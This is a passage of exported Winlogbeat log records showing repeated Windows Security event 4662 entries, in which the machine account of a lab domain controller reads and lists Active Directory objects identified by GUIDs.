	{04828aa9-6e42-4e80-b962-e2fe00754d17}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110181	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.171"	"pBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{4229c897-c211-437c-a5ae-dbf705b696e5}
	Object Name:		%{b0e68889-1cac-4c45-a037-32d97de9583c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{4229c897-c211-437c-a5ae-dbf705b696e5}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{b0e68889-1cac-4c45-a037-32d97de9583c}"	DS	"%{4229c897-c211-437c-a5ae-dbf705b696e5}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{4229c897-c211-437c-a5ae-dbf705b696e5}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110180	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"oxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{04828aa9-6e42-4e80-b962-e2fe00754d17}
	Object Name:		%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{04828aa9-6e42-4e80-b962-e2fe00754d17}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}"	DS	"%{04828aa9-6e42-4e80-b962-e2fe00754d17}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{04828aa9-6e42-4e80-b962-e2fe00754d17}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110175	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"ohDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110174	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"oRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{04828aa9-6e42-4e80-b962-e2fe00754d17}
	Object Name:		%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{04828aa9-6e42-4e80-b962-e2fe00754d17}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{1b40cab4-6cfa-43f9-81fb-db400c3d0071}"	DS	"%{04828aa9-6e42-4e80-b962-e2fe00754d17}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{04828aa9-6e42-4e80-b962-e2fe00754d17}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110173	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"oBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}
	Object Name:		%{d8aa644a-9df7-4ef3-92f3-141c7adea326}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf967950-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{d68270ac-a5dc-4841-a6ac-cd68be38c181}
			{93c7b477-1f2e-4b40-b7bf-007e8d038ccf}
			{87811bd5-cd8b-45cb-9f5d-980f3a9e0c97}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{d8aa644a-9df7-4ef3-92f3-141c7adea326}"	DS	"%{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf967950-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{d68270ac-a5dc-4841-a6ac-cd68be38c181}
			{93c7b477-1f2e-4b40-b7bf-007e8d038ccf}
			{87811bd5-cd8b-45cb-9f5d-980f3a9e0c97}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110168	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"nxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{64759b35-d3a1-42e4-b5f1-a3de162109b3}
	Object Name:		%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}"	DS	"%{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110167	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"nhDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}
	Object Name:		%{d8aa644a-9df7-4ef3-92f3-141c7adea326}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{d8aa644a-9df7-4ef3-92f3-141c7adea326}"	DS	"%{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{4937f40d-a6dc-4d48-97ca-06e5fbfd3f16}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110166	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"nRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{64759b35-d3a1-42e4-b5f1-a3de162109b3}
	Object Name:		%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}"	DS	"%{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110161	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"nBDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110160	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"mxDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{64759b35-d3a1-42e4-b5f1-a3de162109b3}
	Object Name:		%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{024c3ca2-f1f8-4cb4-9d7e-d99ce81450cc}"	DS	"%{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{64759b35-d3a1-42e4-b5f1-a3de162109b3}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110159	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"mhDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf967950-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{eeed0fc8-1001-45ed-80cc-bbf744930720}
			{4699f15f-a71f-48e2-9ff5-5897c0759205}
			{d6d67084-c720-417d-8647-b696237a114c}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{6695419f-8480-4bfd-b1a3-c063f550ce8f}"	DS	"%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf967950-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{eeed0fc8-1001-45ed-80cc-bbf744930720}
			{4699f15f-a71f-48e2-9ff5-5897c0759205}
			{d6d67084-c720-417d-8647-b696237a114c}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110154	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.170"	"mRDBb54ByrYY_kgLWe47"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.990"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}
	Object Name:		%{6695419f-8480-4bfd-b1a3-c063f550ce8f}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		READ_CONTROL
				
	Access Mask:		0x20000
	Properties:		READ_CONTROL
	{1c332fe0-0c2a-4f32-afca-23c5e45a9e77}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%1538
